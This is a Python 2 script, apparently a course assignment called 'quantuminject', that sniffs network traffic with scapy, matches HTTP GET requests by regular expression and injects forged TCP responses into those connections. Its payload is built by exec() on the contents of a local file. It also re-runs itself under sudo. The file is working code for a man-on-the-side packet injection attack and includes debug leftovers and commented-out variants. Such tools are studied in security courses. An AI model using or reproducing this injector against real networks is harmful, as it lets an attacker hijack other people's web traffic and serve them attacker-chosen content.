#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-
import os as OS
import sys as System
import subprocess as Process
from datetime import datetime as Chronos
import re as Regex

#Justification is: Functions in this script require sudo regardless of whether it is main or not.

if OS.getuid() != 0:
    print "This script will require root privileges. Attempting to elevate..."
    Process.call(["sudo"] + System.argv)
    exit(77)

from scapy.all import *

def printHelp():
    print """
    quantuminject [­-i interface] [­-r regexp] [­-d datafile] expression

    -i --interface Listen on network device (e.g., eth0). If not specified, quantuminject should select a default interface to listen on. The same interface should be used for packet injection.

    ­-r --regex Use regular expression to match the request packets for which a response will be spoofed.

    ­-d --data Read the raw data that will be used as the TCP payload of the spoofed response packet from <datafile>
    """

interface = None
spoofed_payload = None
spoofed_packet = None
seq = 0
spoof_next = 0
regex = None

def handle(packet):
    global spoof_next
    global spoofed_packet
    global seq
    if (
        packet.haslayer(IP) and
        (packet[IP].src == '192.168.64.1' or
        packet[IP].dst == '192.168.64.1')
    ):
        packet.show()

    if (
        spoof_next == 0 and
        packet.haslayer(Raw) and
        Regex.search(regex, packet[Raw].load) != None
    ):
        spoofed_packet = packet

        del spoofed_packet[IP].len
        del spoofed_packet[IP].chksum
        del spoofed_packet[TCP].chksum

        spoofed_packet[Ether].src, spoofed_packet[Ether].dst = packet[Ether].dst, packet[Ether].src
        spoofed_packet[IP].src, spoofed_packet[IP].dst = packet[IP].dst, packet[IP].src

        spoofed_packet[TCP].sport, spoofed_packet[TCP].dport =  packet[TCP].dport, packet[TCP].sport
        spoofed_packet[TCP].seq, spoofed_packet[TCP].ack =  packet[TCP].ack, packet[TCP].seq + len(packet[Raw].load)
        spoofed_packet[TCP].flags = 'PA'
        spoofed_packet[TCP].window = 4115

        spoofed_packet[Raw].load = 'HTTP/1.0 200 OK\r\n'

        spoofed_packet.options = []

        sendp(spoofed_packet, iface=interface)

        exec(spoofed_payload)
        spoofed_packet[Raw].load = payload
        sendp(spoofed_packet, iface=interface)


        #spoof_next = 1
    elif (
        spoof_next == 1 and
        packet.haslayer(Raw) and
        packet[Raw].load == 'HTTP/1.0 200 OK\r\n'
    ):
        print "a\na\na\na\na\na"
        spoofed_packet = packet

        del spoofed_packet[IP].len
        del spoofed_packet[IP].chksum
        del spoofed_packet[TCP].chksum

        # spoofed_packet[IP].flags = 'DF'
        spoofed_packet[TCP].seq += len(packet[Raw].load)
        spoofed_packet[TCP].flags = 'FPA'

        # spoofed_packet[Ether].src, spoofed_packet[Ether].dst = None, packet[Ether].src
        # spoofed_packet[IP].src, spoofed_packet[IP].dst = packet[IP].dst, packet[IP].src
        # spoofed_packet[IP].flags = 'DF'
        # spoofed_packet[TCP].sport, spoofed_packet[TCP].dport =  packet[TCP].dport, packet[TCP].sport
        # spoofed_packet[TCP].seq, spoofed_packet[TCP].ack =  packet[TCP].ack + len(packet[Raw].load), packet[TCP].seq
        # spoofed_packet[TCP].flags = 'FPA'
        # spoofed_packet[TCP].window = 4115
        exec(spoofed_payload)
        spoofed_packet[Raw].load = payload
        sendp(spoofed_packet, iface=interface)
        spoofed_packet.show2()
        spoof_next = 0
    # elif (
    #     spoof_next == 2 and
    #     packet.haslayer(TCP) and
    #     packet[TCP].seq == spoofed_packet[TCP].ack
    # ):
    #     spoofed_packet.show()
    #     sendp(spoofed_payload, iface=interface)
    #     spoof_next = 0

with open('example_payload.py', 'r') as file:
    spoofed_payload = file.read()

interface = "bridge100"
regex = r'^GET \/ HTTP\/1\.1'

sniff(prn=handle, iface=interface)
